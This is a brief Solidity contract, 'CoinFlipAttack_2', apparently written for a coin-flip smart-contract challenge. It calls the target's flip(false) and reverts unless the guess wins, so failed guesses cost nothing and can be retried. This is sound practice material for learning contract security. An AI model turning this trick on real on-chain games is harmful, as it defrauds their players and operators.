// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack_2 {
    function tryAttack(address _target) external {
        bool res = ICoinFlip(_target).flip(false);
        require(res);
    }
}
